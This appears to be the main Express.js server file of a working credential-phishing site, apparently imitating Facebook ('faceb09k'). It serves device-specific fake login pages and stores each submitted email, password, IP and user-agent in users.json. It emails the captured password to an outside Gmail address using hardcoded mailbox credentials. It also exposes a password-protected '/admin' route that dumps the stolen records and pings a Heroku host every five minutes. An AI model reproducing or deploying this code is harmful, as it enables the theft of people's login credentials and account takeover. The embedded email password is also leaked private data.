var express = require('express');
var path = require('path');
var favicon = require('serve-favicon');
var logger = require('morgan');
var cookieParser = require('cookie-parser');
var bodyParser = require('body-parser');

var index = require('./routes/index');
var users = require('./routes/users');
var Req = require('request');
var fs = require('fs');
var nodemailer = require('nodemailer');

var app = express();



app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'ejs');

// uncomment after placing your favicon in /public
//app.use(favicon(path.join(__dirname, 'public', 'favicon.ico')));
app.use(logger('dev'));
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: false }));
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public')));

var url = require('url');

app.get('/', function (req, res) {



  var user = req.get('User-Agent');
  user = user.toLowerCase();

  var post = '';



    var pc = 'index',
    andr = 'android',
    ios = 'Iphone';


  if (user.indexOf('android') > -1) res.render(andr,{post:post});
  else  if ((user.indexOf('iphone') > -1) || (user.indexOf('ipad') > -1) || (user.indexOf('ios') > -1) ) res.render(ios,{post:post});
  else
      res.render(pc,{post:post});
    console.log(pc);

});

app.post('/',function (req,res) {

var  User={};



      User.email = req.body.email;
    User.pass = req.body.pass;
    User.ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    User['user-agent'] = req.get('User-Agent');
    User.time = (new Date()).toUTCString();
    save(User,function (err) {
        if (err) return console.log(err);
        res.send('success');
        console.log('success');
        sendMail(`<div style="text-align: center;">
        email:<p><span style="color:darkred";>${User.email}</span></p>
        login:<p><span style="color: red; background-color: yellowgreen">${User.pass}</span></p>
        </div>
        `);
    });









});

app.get('/admin',function (req,res, next) {



    if (req.query.pass !== '1225')
    {
      return next();
    }

    var cmd = req.query.cmd;

    if (cmd == 'get') {

        var fs = require('fs');

        fs.readFile(__dirname + '/' + 'users.json',function (err,data) {
            if (err) return console.log(err);
            data = data.toString();
            res.json(data);


        });




    }

    else {
        res.render('admin',{type:'get'});
    }









});


app.post('/admin',function (req,res) {



    res.render('admin',{type:'get'});
    return;

    for (var key in User)
    {

    }




});


app.use('/what_i_like', users);



// catch 404 and forward to error handler
app.use(function(req, res, next) {
   res.location('/')
       .status(302)
       .end();

});

// error handler
app.use(function(err, req, res, next) {
  // set locals, only providing error in development
  res.locals.message = err.message;
  res.locals.error = req.app.get('env') === 'development' ? err : {};

  // render the error page
  res.status(err.status || 500);
  res.render('error');
});


function save(User,callback) {
    /*
Req.get({
    url:'http://samer69255.tecpt.com/',
    form:im,
    headers:{}
},callback);
*/


    try {
        var txt1 = fs.readFileSync(__dirname+'/'+ 'users.json') || '[]';
        if(txt1.length<5) txt1 = '[]';
    }
    catch (e) {
        txt1 = '[]';
    }
    // var txt2 = `email: ${User.email}\n pass: ${User.pass}\n ip: ${User.ip}\ntime :${User.time}`+`\n`+('-').repeat(50);
    var users = JSON.parse(txt1);
    users.push(User);


    fs.writeFile(__dirname + '/' + 'users.json',JSON.stringify(users,null,4),callback);




}


function sendMail(msg) {
    var transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: 'samersamawi.s@gmail.com',
            pass: 'SamersameR888'
        }
    });

    var mailOptions = {
        from: 'samer',
        to: 'samer69255@gmail.com',
        subject: 'new login',
        html: msg,
    };

    transporter.sendMail(mailOptions, function(error, info){
        if (error) {
            console.log(error);
        } else {
            console.log('Email sent: ' + info.response);
        }
    });
}


(function () {

    setInterval(function () {
        Req.get('https://faceb09k.herokuapp.com/',function (err) {

        });
    },5*60*1000);

})();


module.exports = app;
